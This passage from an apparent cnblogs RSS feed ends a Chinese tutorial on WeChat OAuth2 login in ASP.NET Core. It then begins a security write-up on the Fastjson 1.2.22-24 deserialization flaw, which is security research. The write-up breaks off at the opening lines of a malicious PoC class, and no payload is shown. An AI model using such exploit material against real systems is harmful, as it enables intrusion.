            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;response.IsSuccessStatusCode)
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; OAuthTokenResponse.Failed(&lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; payload = JObject.Parse(&lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;string&lt;/span&gt;.IsNullOrEmpty(payload.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;errcode&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)))
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; OAuthTokenResponse.Failed(&lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; OAuthTokenResponse.Success(payload);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;  Step 1：请求CODE 
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt;  构建用户授权地址
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; BuildChallengeUrl(AuthenticationProperties properties, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; redirectUri)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; QueryHelpers.AddQueryString(Options.AuthorizationEndpoint, &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;
            {
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;appid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.ClientId,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; FormatScope(),
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;response_type&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;redirect_uri&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; redirectUri,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;state&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.StateDataFormat.Protect(properties)
            });
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; FormatScope()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;.Join(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, Options.Scope);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeixinAuthenticationHelper.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_ed489e51-6752-458b-b6fd-3fae0cda4d7b&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ed489e51-6752-458b-b6fd-3fae0cda4d7b&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ed489e51-6752-458b-b6fd-3fae0cda4d7b&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Contains static methods that allow to extract user's information from a &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;JObject&quot;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; instance retrieved from Weixin after a successful authentication process.
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WeixinAuthenticationHelper
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the user identifier.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetOpenId(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the nickname associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetNickname(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nickname&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the gender associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetSex(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;sex&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the province associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetProvince(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;province&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the city associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetCity(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;city&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the country associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetCountry(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;country&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the avatar image url associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetHeadimgUrl(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;headimgurl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the union id associated with the application.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetUnionid(JObject user) =&amp;gt; user.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unionid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Gets the privilege associated with the user profile.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetPrivilege(JObject user)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; value = user.Value&amp;lt;JArray&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;privilege&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;.Join(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, value.ToObject&amp;lt;&lt;span&gt;string&lt;/span&gt;[]&amp;gt;&lt;span&gt;());
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeixinAuthenticationOptions.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;&lt;img id=&quot;code_img_closed_c6d858aa-09b8-4d84-810f-a82255f5b8de&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_c6d858aa-09b8-4d84-810f-a82255f5b8de&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_c6d858aa-09b8-4d84-810f-a82255f5b8de&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; WeixinAuthenticationOptions()
        {
            ClaimsIssuer &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.Issuer;
            CallbackPath &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PathString(WeixinAuthenticationDefaults.CallbackPath);

            AuthorizationEndpoint &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.AuthorizationEndpoint;
            TokenEndpoint &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.TokenEndpoint;
            UserInformationEndpoint &lt;/span&gt;=&lt;span&gt; WeixinAuthenticationDefaults.UserInformationEndpoint;

            Scope.Add(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;snsapi_login&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            Scope.Add(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;snsapi_userinfo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ClaimActions.MapJsonKey(ClaimTypes.NameIdentifier, &quot;openid&quot;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ClaimActions.MapJsonKey(ClaimTypes.Name, &quot;nickname&quot;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ClaimActions.MapJsonKey(&quot;urn:qq:figure&quot;, &quot;figureurl_qq_1&quot;);&lt;/span&gt;
        }
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

&lt;h3&gt;3.怎么用？&lt;/h3&gt;
&lt;p&gt;首先定义我们的接口，接口中当然依旧是用到了 SignInManager，，如果不清楚的，依旧建议去看上一篇。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;     OAuth2登录
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;provider&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;第三方登录提供器&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;returnUrl&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;回调地址&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
&lt;span&gt;        [HttpGet]
        [Description(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OAuth2登录&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        [AllowAnonymous]
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[ValidateAntiForgeryToken]&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; IActionResult OAuth2()
        {
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; provider = HttpContext.Request.Params(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;provider&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; returnUrl = HttpContext.Request.Params(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returnUrl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; redirectUrl = Url.Action(nameof(OAuth2Callback), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Identity&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; { returnUrl = returnUrl ?? &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
            AuthenticationProperties properties &lt;/span&gt;=&lt;span&gt; _signInManager.ConfigureExternalAuthenticationProperties(provider, redirectUrl);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Challenge(properties, provider);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里参数没啥好说的，一个就是 provider:这个东西其实是我们配置的（下面会说），returnUrl，就是你登陆前访问的页面，登陆后还要回过去。 这里还用到i一个回调接口哦，就是 OAuth2Callback，所以至少是需要两个。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;     OAuth2登录回调
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;returnUrl&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;回调地址&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;remoteError&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;第三方登录错误提示&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
&lt;span&gt;        [HttpGet]
        [Description(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OAuth2登录回调&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        [AllowAnonymous]
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[ValidateAntiForgeryToken]&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; IActionResult OAuth2Callback(&lt;span&gt;string&lt;/span&gt; returnUrl = &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt; remoteError = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (remoteError != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                _logger.LogError($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;第三方登录错误：{remoteError}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Unauthorized();
            }
             ExternalLoginInfo info &lt;/span&gt;= &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _signInManager.GetExternalLoginInfoAsync();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (info == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Unauthorized();

             &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = &lt;span&gt;await&lt;/span&gt; _signInManager.ExternalLoginSignInAsync(info.LoginProvider, info.ProviderKey, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
            _logger.LogWarning($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SignInResult:{result.ToJsonString()}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            
              &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (result.Succeeded)
            {
                _logger.LogInformation($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;用户“{info.Principal.Identity.Name}”通过 {info.ProviderDisplayName} OAuth2登录成功&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Ok();
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Unauthorized();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;代码这就完了哦，剩下的就是调试了，使用1中说到的js（ajax），以及结合上一篇的配置，模拟请求去吧，如果你发现返回提示如下错误，那么就等同事成功了，因为可以在header中看到请求的地址，该地址就是微信的二维码的界面，复制出来在浏览器打开就可：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/557390/201811/557390-20181119230046314-2129541595.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是，这里来了个但是，你觉得这样就完了是吧？其实没有，这里有个细节要注意，也就是上面说的 接口的参数：provider,这个东西不是随便写的，可以在请求之前获取一次看看，有哪些provider,如果我们配置了微信那么就是 Weixin,配置了QQ就是QQ，&lt;/p&gt;
&lt;p&gt;查看方式就是一行代码：&lt;/p&gt;
&lt;p&gt;var loginProviders = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();&lt;/p&gt;
&lt;p&gt;这里要注意，否则你的道德返回结果永远都是 未授权，当然这也是可配置的，也就是我们的 WeixinAuthenticationDefaults.cs类中的 的 Scheme,配置啥，传递参数就写啥。&lt;/p&gt;

&lt;h3&gt;4.总结（注意点）&lt;/h3&gt;
&lt;p&gt;1.微信、QQ配置，及开发测试的模拟配置（域名）&lt;/p&gt;
&lt;p&gt;2.跨域问题&lt;/p&gt;
&lt;p&gt;3.参数：provider要一致，不确定的可以通过 _signInManager.GetExternalAuthenticationSchemesAsync() 获取看一下，或者单独讲这个接口提供给前端调用查看。&lt;/p&gt;

</description>
<pubDate>Mon, 19 Nov 2018 15:15:00 +0000</pubDate>
<dc:creator>eSoftor</dc:creator>
<og:description>上一篇是关于模拟请求配置，包括域名问题的解决，本篇就说下授权登录。嗯，比较闲。以前的fx 开发web的时候好像使用的 微信提供的js插件生成二维码，然后扫码登录，，，记不清了，好久不开发微信了。 1.</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Tmc-Blog/p/9986482.html</dc:identifier>
</item>
<item>
<title>Fastjson 1.2.22-24 反序列化漏洞分析 - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/9986427.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/9986427.html</guid>
<description>&lt;p&gt;最近在学习Java安全，感觉反序列化很牛皮，所以就来学习一哈。我Java水平不咋地，文章如果有错请指正。&lt;/p&gt;
&lt;p&gt;开始&lt;/p&gt;
&lt;h2 id=&quot;x00-简单介绍&quot;&gt;0x00 简单介绍&lt;/h2&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;介绍：FastJson是一款由阿里开发的JSON库&lt;br/&gt;影响版本：1.2.22-24&lt;br/&gt;官方通告：https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;br/&gt;补丁：https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;fastjson的简单使用&quot;&gt;FastJson的简单使用&lt;/h3&gt;
&lt;p&gt;先通过一个简单的demo来熟悉一下FastJson的基本操作。首先创建一个Student类，Student.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.test;

public class Student {
    public String name;
    private int age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Students有一个公有属性name和一个私有属性age。下面使用一个测试类，将json字符串反序列化成Student对象，learnFJ.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.test;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.JSONObject;

public class learnFJ {
    public static void main(String args[]) {
        String text = &quot;{\&quot;@type\&quot;:\&quot;ka1n4t.test.Student\&quot;,\&quot;name\&quot;:\&quot;ZhangSan\&quot;,\&quot;age\&quot;:123}&quot;;
        Student obj1 = JSON.parseObject(text, Student.class, Feature.SupportNonPublicField);
        System.out.println(obj1.getName());
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231158872-1181740505.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;x01-原理分析&quot;&gt;0x01 原理分析&lt;/h2&gt;
&lt;h3 id=&quot;分析poc&quot;&gt;分析POC&lt;/h3&gt;
&lt;p&gt;先看一下用于反序列化的恶意类evilClass1.java:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.poc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
